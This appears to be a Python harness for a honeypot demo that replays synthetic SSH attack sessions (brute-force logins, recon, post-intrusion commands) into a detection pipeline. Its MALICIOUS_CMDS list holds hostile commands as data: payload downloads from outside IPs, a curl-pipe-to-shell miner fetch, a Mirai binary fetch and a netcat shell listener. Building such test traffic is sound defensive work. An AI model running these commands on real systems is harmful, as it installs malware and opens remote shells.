"""
simulate.py — attack traffic generator for testing and demos.

Because a locally-run honeypot only ever sees traffic from the Docker network
(RFC1918 IPs with no geolocation), this harness replays realistic attack
sessions using a set of real-world public source IPs so the geo-map, charts and
threat-intel enrichment populate the way they would on an internet-exposed
sensor. It feeds synthetic events through the *same* pipeline as live capture —
nothing here bypasses detection or storage.

Trigger via  POST /api/simulate?sessions=8
"""
from __future__ import annotations
import asyncio
import random
from datetime import datetime, timezone

# A spread of real, publicly-routable ranges commonly seen scanning the internet
# (bogon/known-scanner space) — used only to exercise geolocation in the demo.
SOURCE_IPS = [
    "45.155.205.233", "185.220.101.44", "89.248.165.72", "193.169.255.10",
    "141.98.11.29", "218.92.0.34", "61.177.173.18", "222.186.30.112",
    "5.188.206.18", "80.94.95.116", "92.63.197.55", "116.31.116.24",
    "195.178.110.9", "103.145.13.21", "212.70.149.150", "198.98.51.189",
]
USERNAMES = ["root", "admin", "test", "ubuntu", "oracle", "postgres", "user", "git", "pi"]
PASSWORDS = ["123456", "root", "admin", "password", "12345678", "toor",
             "P@ssw0rd", "qwerty", "1234", "letmein", "0000"]
RECON_CMDS = ["whoami", "uname -a", "cat /etc/passwd", "ps aux", "id", "cat /proc/cpuinfo",
              "ls -la", "cat /etc/os-release", "w"]
MALICIOUS_CMDS = [
    "wget http://45.155.205.233/x86_64 -O /tmp/.a",
    "curl -s http://185.220.101.44/miner.sh | sh",
    "wget http://89.248.165.72/bins/mirai.arm7",
    "nc -lvnp 4444 -e /bin/sh",
    "chmod +x /tmp/.a && ./tmp/.a",
]


def _now():
    return datetime.now(timezone.utc).isoformat()


async def run(pipeline, sessions: int = 8):
    """Generate `sessions` attacker sessions and push them through the pipeline."""
    generated = 0
    for _ in range(sessions):
        ip = random.choice(SOURCE_IPS)
        sess = f"{random.randint(0, 0xffffffffffff):012x}"
        base = {"src_ip": ip, "session": sess, "dst_port": 2222,
                "sensor": "sim-sensor", "protocol": "cowrie"}

        await pipeline.ingest_synthetic({**base, "eventid": "cowrie.session.connect",
                                         "src_port": random.randint(1024, 65535),
                                         "dst_ip": "10.0.0.5"})
        await pipeline.ingest_synthetic({**base, "eventid": "cowrie.client.version",
                                         "version": "SSH-2.0-libssh2_1.9.0"})
        generated += 2

        # brute force: several fails, sometimes a success
        n_fail = random.randint(3, 8)
        for _ in range(n_fail):
            await pipeline.ingest_synthetic({
                **base, "eventid": "cowrie.login.failed",
                "username": random.choice(USERNAMES),
                "password": random.choice(PASSWORDS)})
            generated += 1
            await asyncio.sleep(0.02)

        if random.random() < 0.45:  # ~45% of sessions break in
            await pipeline.ingest_synthetic({
                **base, "eventid": "cowrie.login.success",
                "username": random.choice(["admin", "root", "test"]),
                "password": random.choice(["admin", "1234", "root"])})
            generated += 1
            for cmd in random.sample(RECON_CMDS, random.randint(2, 4)):
                await pipeline.ingest_synthetic({**base, "eventid": "cowrie.command.input", "input": cmd})
                generated += 1
            if random.random() < 0.7:
                await pipeline.ingest_synthetic({
                    **base, "eventid": "cowrie.command.input",
                    "input": random.choice(MALICIOUS_CMDS)})
                generated += 1

        await pipeline.ingest_synthetic({**base, "eventid": "cowrie.session.closed",
                                         "duration": round(random.uniform(2, 40), 1)})
        generated += 1
        await asyncio.sleep(0.05)

    return generated
